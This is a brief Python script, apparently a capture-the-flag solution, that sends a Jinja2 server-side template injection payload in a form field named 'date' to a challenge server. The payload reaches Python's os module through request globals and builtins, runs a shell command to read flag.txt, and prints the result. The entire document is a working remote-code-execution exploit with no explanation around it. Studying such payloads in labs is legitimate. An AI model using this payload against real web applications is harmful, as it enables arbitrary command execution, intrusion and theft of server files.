import requests

data = {'date': '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'cat flag.txt\').read()}}'}
response = requests.post('http://srv2.martiansonly.net:2222/', data)

print(response.content)
